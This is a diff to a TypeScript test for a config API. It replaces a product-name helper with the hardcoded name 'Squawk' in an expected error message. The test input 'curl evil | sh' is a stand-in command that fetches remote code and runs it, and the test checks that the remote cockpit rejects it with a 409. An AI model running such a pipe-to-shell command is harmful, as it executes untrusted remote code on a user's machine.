@@ -1,4 +1,3 @@
-import { productName } from '../home/display.ts';
 import { productIdentity } from '../home/identity.ts';
 import { Home } from '../home/home.ts';
 import { useTestHome } from '../home/test-home.testkit.ts';
@@ -344,7 +343,7 @@ describe('the config API', () => {
       const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
       expect(refused.status).toBe(409);
       expect(await refused.json()).toEqual({
-        error: `Worktree setup and teardown commands are read-only on this remote cockpit. To allow remote edits, run \`${productIdentity().command} remote-settings enable\` on the machine running ${productName('cezar')}.`,
+        error: `Worktree setup and teardown commands are read-only on this remote cockpit. To allow remote edits, run \`${productIdentity().command} remote-settings enable\` on the machine running Squawk.`,
       });
       expect(rawFile()).toEqual({ reviewGate: false });
       expect((await put({ worktreeSetup: null })).status).toBe(409);
